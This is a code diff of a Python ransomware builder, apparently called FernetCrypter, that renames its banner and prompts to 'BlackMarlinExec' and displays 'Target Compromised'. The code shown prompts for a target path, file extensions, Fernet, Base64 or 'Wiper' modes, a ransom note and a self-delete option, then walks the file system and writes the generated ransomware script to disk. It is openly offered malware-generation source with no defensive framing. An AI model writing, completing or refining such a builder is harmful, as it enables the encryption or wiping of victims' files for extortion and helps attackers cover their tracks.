@@ -21,9 +21,8 @@ print(f"""
                   ░░░░▓▓▓▓▓▓▓▓▓▓░░░░░░                                                      
                                                                                             
 
-Welcome to Ransomware Builder (FernetCrypter)
-Ransomware Builder Build Files .py
-Encryption Support Fernet , Base64!!!
+Target Compromised
+BlackMarlinExec_Done
 """)
 print("Path Attack 1 2 or 3")
 code_path = input('Path:')
@@ -45,12 +44,12 @@ code_1 = input('File Extension:')
 print("Fernet,Fernet_ReEncryption,base,Fernet_base,Fernet_ReEncryption_base,Wiper,Wiper_file")
 code_2 = input('Encryption:')
 
-print("Remove Ransomware File (RUN) Y or N?")
+print("Remove BlackMarlinExec File (RUN) Y or N?")
 code_11 = input('Files Ransomware Delete:')
 if code_11 == 'Y':
     code_11 = "os.remove(__file__)"
 else:
-    code_11 = "print('Ransomware Runing (No Remove!) ')"
+    code_11 = "print('BlackMarlinExec Runing (No Remove!) ')"
 print("Note File Name (Don't End with .txt)")
 code_3 = input('Note:')
 
@@ -121,7 +120,7 @@ File Extension: {code_1}
 <--------------- Logs Ransomware
 '''
 
-code_12 = 'print("Ransomware Runing Done!!!!!!")'
+code_12 = 'print("BlackMarlinExec Runing Done!!!!!!")'
 
 if code_2 == 'Fernet_ReEncryption':
     loader_encrypt = 'print("SKIP ENCRYPTION FERNET")'
@@ -251,7 +250,7 @@ for dirName, subdirList, fileList in os.walk(path_files):
 {code_12}"""
 
 print("Write Name Files (Not Enter End with .py)")
-Name_Files = input("Ransomware Files Name:")
+Name_Files = input("BlackMarlinExec Files Name:")
 file_ransom = open(Name_Files + '.py','w')
 file_ransom.write(file_code)
 file_ransom.close()
